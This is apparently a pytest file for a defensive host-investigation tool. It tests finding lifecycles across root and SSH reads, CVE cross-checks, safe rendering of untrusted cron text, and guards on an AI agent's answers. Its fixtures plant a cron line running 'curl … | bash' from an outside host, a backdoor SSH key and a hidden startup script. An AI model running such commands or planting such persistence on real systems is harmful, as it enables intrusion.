"""Seams between Phase A features, found in the phase audit (docs/phaseA/AUDIT.md).

Each test here reproduces a problem that only shows when two features meet --
e.g. a finding raised by a root read through the sub-agent (A.5/A.1) meeting the
finding lifecycle (0.1) on a later, less-privileged SSH read.
"""
from __future__ import annotations

import json
import time

from kratos.live import record as live_record
from tests.test_live_response import _inv

T = "10.0.0.5"


def _two_runs(tmp_path, monkeypatch, first_inv, second_inv):
    """Two investigations of the same machine; returns the second report's lifecycle."""
    from kratos import kratos_config
    from kratos.adapters import findings_engine as FE
    from kratos.run_context import run_scope

    monkeypatch.setattr(kratos_config, "get_active_target", lambda: T)
    with run_scope("cli", target=T):
        live_record.run(tmp_path, T, reader=lambda: first_inv)
        first = json.loads(FE.write_findings_report(tmp_path)[0].read_text())
    time.sleep(0.01)
    with run_scope("cli", target=T):
        live_record.run(tmp_path, T, reader=lambda: second_inv)
        second = json.loads(FE.write_findings_report(tmp_path)[0].read_text())
    return first, second


def test_a_non_root_read_that_cannot_see_every_process_does_not_close_a_root_seen_live_finding(tmp_path, monkeypatch):
    """Run 1: the sub-agent (root) sees a process running from a memfd -> LIVE-002.
    Run 2: SSH as a normal user (an ssh_first link whose SSH came back) cannot read
    other users' /proc entries, so the process is simply invisible to it. That read
    finished, but it did not look at the process: the finding must stay open."""
    root_read = _inv(procs=[{"pid": 5, "exe": "/memfd:x (deleted)", "comm": "m", "starttime": 2, "uid": 0}],
                     reader_uid=0, via="subagent")
    # the process is still listed in /proc (its stat is world-readable) but its exe is not
    user_read = _inv(procs=[{"pid": 5, "comm": "m", "starttime": 2, "uid": 0},
                            {"pid": 900, "exe": "/usr/bin/bash", "comm": "bash", "starttime": 3, "uid": 1000,
                             "exe_package": "bash"}],
                     reader_uid=1000, via="ssh", proc_gaps={"exe": 1, "environ": 1},
                     proc_gap_pids={5: {"exe", "environ"}})
    first, second = _two_runs(tmp_path, monkeypatch, root_read, user_read)
    live = [f for f in first["findings"] if f["id"] == "LIVE-002"]
    assert live, first["findings"]
    assert live[0]["finding_key"] not in second["lifecycle"]["fixed"], (
        "a read that could not see every process marked a root-seen LIVE finding as gone")


def test_with_hidepid_a_non_root_read_cannot_close_a_live_finding(tmp_path, monkeypatch):
    """/proc mounted hidepid=2: the normal-user read doesn't even list root's processes."""
    root_read = _inv(procs=[{"pid": 5, "exe": "/memfd:x (deleted)", "comm": "m", "starttime": 2, "uid": 0}])
    user_read = _inv(procs=[{"pid": 900, "exe": "/usr/bin/bash", "comm": "bash", "starttime": 3, "uid": 1000,
                             "exe_package": "bash"}], reader_uid=1000, hidepid=True)
    first, second = _two_runs(tmp_path, monkeypatch, root_read, user_read)
    key = [f["finding_key"] for f in first["findings"] if f["id"] == "LIVE-002"][0]
    assert key not in second["lifecycle"]["fixed"]


def test_a_process_that_really_ended_closes_its_finding_even_over_ssh(tmp_path, monkeypatch):
    """The fix must not freeze findings: the same SSH read, where the process is no
    longer listed at all (no hidepid), marks it inactive."""
    root_read = _inv(procs=[{"pid": 5, "exe": "/memfd:x (deleted)", "comm": "m", "starttime": 2, "uid": 0}])
    user_read = _inv(procs=[{"pid": 900, "exe": "/usr/bin/bash", "comm": "bash", "starttime": 3, "uid": 1000,
                             "exe_package": "bash"}], reader_uid=1000, proc_gaps={"exe": 3},
                     proc_gap_pids={77: {"exe"}, 78: {"exe"}, 79: {"exe"}})
    first, second = _two_runs(tmp_path, monkeypatch, root_read, user_read)
    key = [f["finding_key"] for f in first["findings"] if f["id"] == "LIVE-002"][0]
    assert key in second["lifecycle"]["fixed"]


def test_a_root_read_that_sees_everything_still_closes_a_live_finding(tmp_path, monkeypatch):
    """The fix must not stop findings from closing: the same root read without the
    process marks it inactive."""
    with_proc = _inv(procs=[{"pid": 5, "exe": "/memfd:x (deleted)", "comm": "m", "starttime": 2, "uid": 0}])
    without = _inv(procs=[{"pid": 7, "exe": "/usr/bin/bash", "comm": "bash", "starttime": 3, "uid": 0,
                           "exe_package": "bash"}])
    first, second = _two_runs(tmp_path, monkeypatch, with_proc, without)
    key = [f["finding_key"] for f in first["findings"] if f["id"] == "LIVE-002"][0]
    assert key in second["lifecycle"]["fixed"]


def _persist_two_runs(tmp_path, monkeypatch, reads):
    """Several investigations of one fake machine, each with the given persistence
    read; returns every report."""
    from kratos import kratos_config
    from kratos.adapters import findings_engine as FE
    from kratos.persist import record as persist_record
    from kratos.run_context import run_scope

    monkeypatch.setattr(kratos_config, "get_active_target", lambda: T)
    data = tmp_path / "data"
    data.mkdir()
    out = []
    for inv in reads:
        with run_scope("cli", target=T):
            persist_record.run(data, T, reader=lambda _verify, inv=inv: inv)
            out.append(json.loads(FE.write_findings_report(data)[0].read_text()))
        time.sleep(0.01)
    return out


def test_an_ssh_read_that_cannot_open_root_ssh_does_not_close_a_root_key_finding(tmp_path, monkeypatch):
    """Runs 1-2 through the sub-agent (root): a clean baseline, then a new key in
    /root/.ssh/authorized_keys -> PERSIST-006. Run 3 over SSH as a normal user:
    /root/.ssh can't be opened, so the key is not seen -- but it was not looked at.
    PERSIST-006 must stay open."""
    import os

    from tests.test_persistence import _w, make_machine, run_agent, run_ssh

    clean = make_machine(tmp_path, "debian", name="clean")
    keyed = make_machine(tmp_path, "debian", name="keyed")
    _w(keyed / "root/.ssh/authorized_keys",
       "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbackdoor new@attacker\n")
    first, second = run_agent(clean), run_agent(keyed)
    os.chmod(keyed / "root/.ssh", 0o000)
    try:
        third = run_ssh(tmp_path, keyed)
    finally:
        os.chmod(keyed / "root/.ssh", 0o700)
    assert third.get("gaps"), "the SSH read should report /root/.ssh as unreadable"
    reports = _persist_two_runs(tmp_path, monkeypatch, [first, second, third])
    keys = [f["finding_key"] for f in reports[1]["findings"] if f["id"] == "PERSIST-006"]
    assert keys, reports[1]["findings"]
    assert keys[0] not in reports[2]["lifecycle"]["fixed"], (
        "an SSH read that could not open /root/.ssh marked the root key finding as fixed")


# ------------------------------------------------- a huge file in /tmp must not blind the live read
def test_a_dropped_file_over_the_hash_cap_is_not_hashed_on_either_transport(tmp_path):
    """Over SSH every dropped executable used to be hashed whatever its size: one big
    file in /tmp kept sha256sum busy past the read's time limit and the whole live read
    was lost. Now both transports skip it the same way and say so."""
    import os

    from kratos.adapters import live_response as L
    from tests.test_live_response import _planted, run_agent, run_ssh

    root = _planted(tmp_path)
    big = root / "tmp" / ".big"
    with open(big, "wb") as fh:                       # sparse: no real disk space
        fh.truncate(L.MAX_HASH_BYTES + 1)
    os.chmod(big, 0o755)
    ssh, agent = run_ssh(tmp_path, root), run_agent(root)
    for inv in (ssh, agent):
        item = inv["temp_files"]["/tmp/.big"]
        assert "sha256" not in item and item.get("hash_skipped") == "too large to hash", item
    assert ssh["temp_files"] == agent["temp_files"]


# ------------------------------------------------- a timed-out remote read stops on the target too
def test_remote_commands_and_scripts_carry_the_client_deadline(monkeypatch):
    from kratos import kratos_config
    from kratos.adapters import ssh_remote as S

    seen: list[list[str]] = []

    def fake_run(argv, **kw):
        seen.append(argv)
        import subprocess
        return subprocess.CompletedProcess(argv, 0, "", "")
    monkeypatch.setattr(S._cancel, "run", fake_run)
    kratos_config.set_active_target("10.0.0.5")
    S.run_remote_script("echo hi", timeout=42, shell="sh")
    S.run_remote_command("uptime", timeout=7)
    assert "timeout -k 5 42 sh -s" in seen[0][-1]
    assert "timeout -k 5 7" in seen[1][-1] and "uptime" in seen[1][-1]


def test_the_deadline_wrapper_kills_the_whole_remote_command_group(tmp_path):
    """Run the exact wrapper a target would run (GNU timeout here): a busy child of
    the script must die at the deadline, not outlive it."""
    import shutil
    import subprocess

    import pytest

    from kratos.adapters import ssh_remote as S

    if not shutil.which("timeout"):
        pytest.skip("no timeout(1) on this machine")
    marker = tmp_path / "still-running"
    cmd = S._with_remote_deadline("sh -s", 1)
    script = f"sh -c 'sleep 4; touch {marker}' & wait\n"
    t0 = __import__("time").monotonic()
    subprocess.run(["sh", "-c", cmd], input=script, text=True, capture_output=True, timeout=20)
    assert __import__("time").monotonic() - t0 < 3.5
    __import__("time").sleep(4.5)
    assert not marker.exists(), "a child of the timed-out script kept running"


# ------------------------------------------- the package cross-check meets the live listener map
def _scan(port: int, cve: str) -> dict:
    return {"target": T, "findings": [{"source": "vulscan", "host": T, "port": port, "product": "nginx",
                                       "version": "1.18.0", "cve_ids": [cve]}]}


def _live(port: int, exe: str | None, package: str | None, seen: bool = True) -> dict:
    return {"listeners": [{"port": port, "proto": "tcp", "seen": seen, "exe": exe, "package": package}]}


class _Inv:
    packages = [{"name": "nginx-core", "source": "nginx", "version": "1.18.0-6ubuntu14.6"},
                {"name": "nginx", "source": "nginx", "version": "1.18.0-6ubuntu14.6"}]


PKG_DOC = {"selector": "ubuntu:22.04", "inventory_id": 1}
CVE = "CVE-2021-23017"


def test_a_hand_built_listener_keeps_a_cve_the_package_fixed():
    """The distribution's nginx package has the fix, but what answers on port 80 is a
    build in /usr/local that no package owns: the network match must stay."""
    from kratos.pkgvuln.crosscheck import listener_doubts

    doubts = listener_doubts(PKG_DOC, _Inv(), _scan(80, CVE), _live(80, "/usr/local/nginx/sbin/nginx", None),
                             {CVE: {"nginx"}})
    assert CVE in doubts and "/usr/local/nginx/sbin/nginx" in doubts[CVE] and "port 80" in doubts[CVE]


def test_the_packaged_listener_or_an_unseen_one_leaves_the_backport_verdict():
    from kratos.pkgvuln.crosscheck import listener_doubts

    packaged = _live(80, "/usr/sbin/nginx", "nginx-core:amd64")
    assert listener_doubts(PKG_DOC, _Inv(), _scan(80, CVE), packaged, {CVE: {"nginx"}}) == {}
    unseen = _live(80, None, None, seen=False)          # another user's socket over SSH
    assert listener_doubts(PKG_DOC, _Inv(), _scan(80, CVE), unseen, {CVE: {"nginx"}}) == {}
    from_memory = _live(80, "/memfd:x (deleted)", None)  # seen, and certainly not the package
    assert CVE in listener_doubts(PKG_DOC, _Inv(), _scan(80, CVE), from_memory, {CVE: {"nginx"}})


def test_vuln001_keeps_a_doubted_cve_as_an_entity_and_says_why():
    from kratos.adapters import findings_engine as FE

    why = f"{CVE}: nginx has the fix, but what listens on port 80 is /usr/local/nginx/sbin/nginx"
    f = FE._vulnerability_findings(_scan(80, CVE), {}, {CVE: why})[0]
    assert f.severity == "medium" and any(CVE in e for e in f.entities)
    assert any("/usr/local/nginx/sbin/nginx" in line for line in f.evidence)


def test_the_live_snapshot_records_who_listens(tmp_path):
    from kratos.live.record import listeners

    inv = _inv(procs=[{"pid": 10, "exe": "/usr/local/nginx/sbin/nginx", "exe_package": None, "comm": "nginx",
                       "starttime": 1}],
               sockets=[{"proto": "tcp", "local_port": 80, "state": "0A", "pid": 10},
                        {"proto": "tcp6", "local_port": 22, "state": "0A", "pid": None},
                        {"proto": "tcp", "local_port": 5555, "state": "01", "pid": 10}])
    got = {x["port"]: x for x in listeners(inv)}
    assert set(got) == {80, 22}                          # an established connection is not a listener
    assert got[80]["seen"] and got[80]["exe"] == "/usr/local/nginx/sbin/nginx" and got[80]["package"] is None
    assert not got[22]["seen"]


# ------------------------------------------- a file name built to break line-by-line listings
def test_a_newline_in_a_startup_file_name_is_a_finding_on_both_transports(tmp_path):
    """/etc/profile.d/'a<newline>b.sh' is sourced at every login (the glob matches it),
    and the SSH read skips it because the name splits in two. It used to show only as
    an info gap; it is now PERSIST-001 (medium) on both transports."""
    from kratos.adapters import persistence as P
    from kratos.persist import judge as J
    from tests.test_persistence import _w, make_machine, run_agent, run_ssh

    root = make_machine(tmp_path, "debian", name="odd")
    _w(root / "etc/profile.d/a\nb.sh", "nohup /tmp/.x &\n")
    for inv in (run_ssh(tmp_path, root), run_agent(root)):
        j = J.judge(inv, None, areas_known=P.AREAS)
        hits = [s for s in j.signals if s.rule == "PERSIST-001" and "newline or tab" in s.title]
        assert hits and hits[0].severity == "medium", [s.title for s in j.signals]
        assert hits[0].entities == ["/etc/profile.d#odd-name"]


# ------------------------------------------- what the SSH live read could not see is reported
def test_ssh_read_reports_too_many_temp_files_like_the_agent(tmp_path):
    """kr_temp's notes (search timed out / too many files) were filtered away with the
    file list over SSH, so a partial temp search looked complete. Both transports now
    report it."""
    import os

    from kratos.adapters import live_response as L
    from tests.test_live_response import _planted, run_agent, run_ssh

    root = _planted(tmp_path)
    d = root / "tmp" / "many"
    d.mkdir()
    for i in range(L.MAX_TEMP_FILES + 3):
        f = d / f"x{i}"
        f.write_text("#!/bin/sh\n")
        os.chmod(f, 0o755)
    for inv in (run_ssh(tmp_path, root), run_agent(root)):
        assert any(t.get("what") == "temp files" for t in inv["truncated"]), inv["truncated"]


def test_unopenable_temp_folders_and_hidepid_are_blind_spots(tmp_path):
    import os

    from kratos.live import record
    from tests.test_live_response import _planted, run_agent, run_ssh

    root = _planted(tmp_path)
    locked = root / "tmp" / "systemd-private-x"
    locked.mkdir()
    (root / "proc" / "mounts").write_text("proc /proc proc rw,nosuid,nodev,noexec,relatime,hidepid=2 0 0\n")
    os.chmod(locked, 0o000)
    try:
        ssh, agent = run_ssh(tmp_path, root), run_agent(root)
    finally:
        os.chmod(locked, 0o700)
    assert "/tmp/systemd-private-x" in ssh["temp_denied"] and ssh["temp_denied"] == agent["temp_denied"]
    assert ssh["hidepid"] is True
    blind = record.blind_spots({**ssh, "reader_uid": 1000})
    why = record.entity_blind({"blind": blind})
    assert why("LIVE-004", "/tmp/systemd-private-x/payload#abc") and why("LIVE-002", "/memfd:x|5|2")


# ------------------------------------------- attacker-written cron/unit text on every screen (A.4 x A.1)
def test_hostile_cron_lines_in_persist_findings_reach_no_screen_raw(tmp_path):
    """A.4 left cron and package text for when A.1/A.2 merged. A cron line is written by
    whoever owns the machine -- here every corpus payload is planted as a cron command
    after the baseline, judged into PERSIST findings, and drawn by the real TUI panel,
    the CLI panel and the model's tool-result envelope."""
    import io
    from dataclasses import asdict

    from rich.console import Console

    from _untrusted_corpus import CORPUS, assert_screen_safe
    from kratos import untrusted
    from kratos.adapters import findings_engine as FE
    from kratos.adapters import persistence as P
    from kratos.agent import console as cli
    from kratos.persist import baseline as B
    from kratos.persist import judge as J
    from kratos.tui_mk2 import render as R
    from tests.test_persistence import make_machine, run_agent

    clean = make_machine(tmp_path, "debian", name="clean")
    base = B.save_first_look(tmp_path / "dd", "m", run_agent(clean), areas=P.AREAS)
    hostile = make_machine(tmp_path, "debian", name="hostile")
    for i, payload in enumerate(CORPUS.values()):
        line = payload.replace("\n", " ").replace("\r", " ")[:300]
        f = hostile / f"etc/cron.d/job{i}"            # raw bytes: a lone surrogate is invalid UTF-8 on disk
        f.write_bytes(f"* * * * * root curl -s http://198.51.100.9/x | bash # {line}\n".encode("utf-8", "surrogatepass"))
    j = J.judge(run_agent(hostile), base, areas_known=P.AREAS)
    doc = {"target": T, "checked_at": "2026-10-15T00:00:00Z", "signals": [s.as_dict() for s in j.signals]}
    findings = [asdict(f) for f in FE._persistence_findings(doc)]
    assert any(f["id"] == "PERSIST-001" for f in findings)
    for f in findings:
        c = Console(file=io.StringIO(), force_terminal=False, color_system=None, width=300, record=True)
        c.print(R.finding_panel(f, time_str="10:00"))
        assert_screen_safe(c.export_text(styles=False), where=f"TUI {f['id']}")
        k = cli._MarginConsole(file=io.StringIO(), force_terminal=True, color_system="standard", width=300,
                               record=True, highlight=False)
        cli.render_finding(k, f)
        assert_screen_safe(k.export_text(styles=False), where=f"CLI {f['id']}")
    model_view = untrusted.envelope({"findings": findings}, run_id="r", call_id="7-c0ffee")
    assert "\x1b" not in model_view and model_view.rstrip().endswith("<<end id=7-c0ffee>>")
    assert model_view.count("<<end id=7-c0ffee>>") == 1     # the corpus guesses other ids; a real id is random per call


# ------------------------------------------- what an investigation's answer says was not checked
def _run_check(name, monkeypatch, tmp_path, module, inv):
    import kratos.collect.checks  # noqa: F401 -- registers checks
    from kratos.collect.registry import CheckContext, get

    monkeypatch.setattr(module, "_default_reader", (lambda *_a: inv))
    ctx = CheckContext(target=T, target_key=T, data_dir=tmp_path, transport="ssh",
                       dispatch=lambda *a, **k: {}, deadline=0.0, now=0.0)
    return get(name).run(ctx)


def test_a_restart_hint_is_not_a_not_checked_gap(tmp_path, monkeypatch):
    """A process still running an upgraded binary is housekeeping (LIVE-007's hint).
    It used to reach every answer as '[NOTE: not checked in this investigation: live
    response: N process(es) are still running a program file that a package update
    replaced ...]' -- false: those processes were checked."""
    from kratos.live import record

    root_read = _inv(procs=[{"pid": 9, "exe": "/usr/sbin/agetty (deleted)", "exe_exists": True,
                             "exe_package": "util-linux", "comm": "agetty", "starttime": 4}])
    res = _run_check("live_response", monkeypatch, tmp_path, record, root_read)
    assert res.coverage_gaps == [] and res.status == "ok"
    doc = json.loads(open(res.detail).read())
    assert any(s["rule"] == "LIVE-007" and "restart" in " ".join(s["evidence"]) for s in doc["signals"])


def test_the_answer_names_non_root_limits_briefly_and_the_fix_once(tmp_path, monkeypatch):
    from kratos.agent.loop import _coverage_note
    from kratos.live import record

    user_read = _inv(procs=[{"pid": 900, "exe": "/usr/bin/bash", "comm": "bash", "starttime": 3, "uid": 1000,
                             "exe_package": "bash"}], reader_uid=1000, proc_gaps={"exe": 26, "environ": 26},
                     proc_gap_pids={i: {"exe"} for i in range(26)}, temp_denied=["/tmp/systemd-private-a"])
    res = _run_check("live_response", monkeypatch, tmp_path, record, user_read)
    assert res.coverage_gaps == [
        "live response: 26 process(es) of other users could not be read over this SSH login",
        "live response: 1 temp folder(s) could not be opened over this SSH login"]
    gaps = res.coverage_gaps + ["persistence: 2 place(s) only root can read were not read over this SSH login"]
    note = _coverage_note(gaps)
    assert note.count("sub-agent") == 1 and len(note) < 500, note


# ------------------------------------------- the model's window starts with the findings
def test_the_model_reads_correlation_findings_first_not_report_paths():
    """A correlate_findings result reached the model through a 1,500-character window
    that opened with report file paths and the inputs_used table (~900 characters), so
    a finding's evidence -- the attacker's IP in a real A1 run -- sat at the edge."""
    from kratos.agent.loop import OBSERVATION_CHAR_CAP, _for_model
    from kratos import attack, untrusted

    inputs = {f"input_{i}": f"/home/someone/data/dir/category_{i}_20261015_222031_123456.json" for i in range(12)}
    result = {"status": "ok", "result": {
        "findings_json_file": "/home/someone/data/reports/findings_20261015_222040.json",
        "findings_md_file": "/home/someone/data/reports/findings_20261015_222040.md",
        "inputs_used": inputs, "missing_inputs": ["system_context"], "input_errors": {},
        "staleness_warning": None,
        "findings": [{"id": "CORR-SSH-001", "severity": "high", "title": "SSH exposed with a burst",
                      "evidence": ["Bursts of failed SSH logins: 5",
                                   "Source IP(s) behind this activity: 10.136.28.52 (88 events)."]}]}}
    view = untrusted.envelope(attack.compact_for_model(_for_model("correlate_findings", result)),
                              run_id="r", call_id="3-5eed00", max_chars=OBSERVATION_CHAR_CAP)
    assert "10.136.28.52" in view and "findings_json_file" not in view and "inputs_used" not in view
    assert "missing_inputs" in view                       # what wasn't used still reaches the model
    assert result["result"]["inputs_used"] == inputs      # the real result is untouched
    assert _for_model("run_nmap_scan", result) is result


# ------------------------------------------- Guard 12: serious findings the answer leaves out
_CORR = {"id": "CORR-SSH-001", "severity": "high", "title": "SSH exposed with failed-login burst activity observed",
         "entities": ["10.136.28.52"],
         "evidence": ["Source IP(s) behind this activity: 10.136.28.52 (88 events).",
                      "Threat-intel corroboration (offline OTX cache): source IP 10.136.28.52 is KNOWN-MALICIOUS"]}
_LIVE = {"id": "LIVE-002", "severity": "high", "title": "1 process(es) running from memory or a deleted temporary file",
         "entities": ["/memfd:stage (deleted)|353191|467793179"], "evidence": ["pid 353191 ..."]}
# the real eval answers (R1_live run 2 and A8 run 1 on the merged code)
_R1_ANSWER = ("This system shows signs of a persistent brute-force attack (156 failed SSH login attempts from "
              "10.136.28.1 over the last 24 hours). Evidence of log tampering (LOG-003) ...")
_A8_ANSWER = "The target is under an SSH brute-force attack from 10.136.28.52; fail2ban should ban it."


def test_guard12_finds_what_a_real_answer_left_out_and_the_block_lists_it():
    from kratos import finding_facts as FF

    left = dict((f["id"], m) for f, m in FF.left_out(_R1_ANSWER, [_CORR, _LIVE]))
    assert left["LIVE-002"] == ["not discussed"]
    assert "source 10.136.28.52" in left["CORR-SSH-001"]          # the answer named the wrong address
    block = FF.answer_block([_CORR, _LIVE], _R1_ANSWER)
    assert block.startswith("Kratos found (checked by Kratos itself")
    assert "/memfd:stage (pid 353191) (not discussed below)" in block
    assert "source 10.136.28.52, known-malicious in the threat-intel cache" in block
    a8 = dict((f["id"], m) for f, m in FF.left_out(_A8_ANSWER, [_CORR]))
    assert a8["CORR-SSH-001"] == ["known-malicious in the threat-intel cache"]   # the IP was there, the match wasn't


def test_guard12_stays_quiet_for_a_complete_answer_or_a_decided_finding():
    from kratos import finding_facts as FF

    complete = ("Brute force from 10.136.28.52, which the threat-intel cache lists as malicious; and a process "
                "(pid 353191) runs from memory.")
    assert FF.left_out(complete, [_CORR, _LIVE]) == []
    assert "not discussed" not in FF.answer_block([_CORR, _LIVE], complete)
    assert FF.left_out("nothing", [dict(_LIVE, state="risk_accepted")]) == []
    assert FF.answer_block([dict(_LIVE, severity="medium")], "nothing") == ""


def test_the_digest_tells_the_model_what_a_finding_is_without_machine_text():
    """LIVE-002 used to reach the model as 'LIVE-002 (high)' and nothing more (its title is
    kept out of the digest), so the model ignored it. Now: a fixed description and the
    validated facts -- never the program path, which the machine wrote."""
    from kratos.collect.digest import _finding_tag

    tag = _finding_tag(_LIVE, True)
    assert "process running from memory" in tag and "pid 353191" in tag and "memfd:stage" not in tag
    assert "source 10.136.28.52 (known-malicious" in _finding_tag(_CORR, True)


def test_an_address_the_answer_invents_is_flagged():
    from kratos.agent.loop import _ungrounded_ips

    tx = [{"observation": {"result": {"findings": [_CORR]}}}, {"digest": "target 10.136.28.168"}]
    assert _ungrounded_ips(_R1_ANSWER, "check", tx) == ["10.136.28.1"]
    assert _ungrounded_ips("brute force from 10.136.28.52", "check", tx) == []


def test_an_invented_address_at_the_end_of_a_sentence_is_flagged():
    """`... involve 198.51.100.77.` -- the sentence's full stop used to hide the address."""
    from kratos.agent.loop import _ungrounded_ips

    tx = [{"observation": {"line": "from 203.0.113.7"}}]
    assert _ungrounded_ips("It may also involve 198.51.100.77.", "check", tx) == ["198.51.100.77"]
    assert _ungrounded_ips("Seen from 203.0.113.7.", "check", tx) == []
    assert _ungrounded_ips("version 1.2.3.4.5 here", "check", tx) == []


def test_guard12_reaches_the_final_answer(tmp_path, monkeypatch):
    from kratos.agent import loop as agent_loop
    from kratos.agent.tools import TOOL_REGISTRY
    from kratos import kratos_config
    from tests.test_agent_loop_guards import ScriptedChat, _final_json, _tool_json

    def correlate(**kwargs):
        return {"findings_json_file": "f.json", "findings_md_file": "f.md", "inputs_used": {}, "missing_inputs": [],
                "input_errors": {}, "staleness_warning": None, "findings": [_CORR, _LIVE], "count": 2}
    monkeypatch.setattr(TOOL_REGISTRY["correlate_findings"], "handler", correlate)
    kratos_config.set_active_target(T)
    better = _R1_ANSWER + " A process (pid 353191) is running from memory (LIVE-002)."
    chat = ScriptedChat([_tool_json("correlate_findings"), _final_json(_R1_ANSWER), _final_json(better)])
    monkeypatch.setattr(agent_loop, "agent_chat", chat)
    result = agent_loop.run_agent("check this system for anything suspicious", tmp_path, max_iters=6)
    rejected = [s for s in result["transcript"] if s.get("status") == "final_answer_rejected"]
    assert len(rejected) == 1 and rejected[0]["violations"] == ["serious_finding_left_out"]   # asked once
    answer = result["final_answer"]
    assert answer.startswith("Kratos found") and better in answer
    assert "source 10.136.28.52" in answer.split("\n\n")[0]                        # the block names the right address
    assert "[NOTE: this answer mentions 10.136.28.1" in answer                      # the invented one is flagged


def test_guard12_never_blocks_a_stubborn_answer_the_block_still_lists_it(tmp_path, monkeypatch):
    from kratos.agent import loop as agent_loop
    from kratos.agent.tools import TOOL_REGISTRY
    from kratos import kratos_config
    from tests.test_agent_loop_guards import ScriptedChat, _final_json, _tool_json

    monkeypatch.setattr(TOOL_REGISTRY["correlate_findings"], "handler",
                        lambda **kw: {"findings": [_LIVE], "missing_inputs": [], "input_errors": {},
                                      "staleness_warning": None, "count": 1})
    kratos_config.set_active_target(T)
    chat = ScriptedChat([_tool_json("correlate_findings")] + [_final_json("All good.")] * 3)
    monkeypatch.setattr(agent_loop, "agent_chat", chat)
    result = agent_loop.run_agent("anything new?", tmp_path, max_iters=6)
    assert result["status"] == "final_answer" and len(chat.calls) == 3          # one retry, then accepted
    assert "LIVE-002" in result["final_answer"] and "(not discussed below)" in result["final_answer"]


def test_collection_runs_nmap_quietly_but_the_scan_command_still_reports(tmp_path, monkeypatch, capsys):
    import subprocess

    from kratos.adapters import nmap_scan

    monkeypatch.setattr(nmap_scan._cancel, "run",
                        lambda cmd, **kw: subprocess.CompletedProcess(cmd, 0, "PORT STATE SERVICE\n22/tcp open ssh\n", ""))
    with nmap_scan.quiet():
        nmap_scan.run_nmap_scan(tmp_path, "10.0.0.5")
    assert capsys.readouterr().err == ""
    nmap_scan.run_nmap_scan(tmp_path, "10.0.0.5")
    assert "22/tcp open ssh" in capsys.readouterr().err


def test_guard12_holds_a_narrow_question_to_its_own_topic(tmp_path, monkeypatch):
    """'Has it been tampered with?' answered well, while the lab also has an unrelated SSH
    brute-force finding open: no retry (the eval showed one call wasted per run, and once an
    unavailable model on the retry); Kratos's list still names the brute force on top."""
    from kratos.agent import loop as agent_loop
    from kratos.agent.tools import TOOL_REGISTRY
    from kratos import finding_facts as FF, kratos_config
    from tests.test_agent_loop_guards import ScriptedChat, _final_json, _tool_json

    assert FF.relevant_to("has the system been tampered with?", {"id": "INTEG-001"})
    assert not FF.relevant_to("has the system been tampered with?", {"id": "CORR-SSH-001"})
    assert FF.relevant_to("check this system for anything suspicious", {"id": "CORR-SSH-001"})
    # seen in the eval: "malicious files" was taken as a broad question
    assert not FF.relevant_to("scan the system for malicious files", {"id": "CORR-SSH-001"})
    assert FF.relevant_to("scan the system for malicious files", {"id": "LIVE-002"})
    assert FF.relevant_to("enable fail2ban if it's inactive", {"id": "CORR-SSH-001"})
    monkeypatch.setattr(TOOL_REGISTRY["correlate_findings"], "handler",
                        lambda **kw: {"findings": [_CORR], "missing_inputs": [], "input_errors": {},
                                      "staleness_warning": None, "count": 1})
    kratos_config.set_active_target(T)
    answer = "Yes: /etc/crontab was changed to run a remote script."
    chat = ScriptedChat([_tool_json("correlate_findings"), _final_json(answer)])
    monkeypatch.setattr(agent_loop, "agent_chat", chat)
    result = agent_loop.run_agent("has the system been tampered with?", tmp_path, max_iters=6)
    assert len(chat.calls) == 2 and not [s for s in result["transcript"] if s.get("status") == "final_answer_rejected"]
    assert result["final_answer"].startswith("Kratos found") and "CORR-SSH-001" in result["final_answer"]
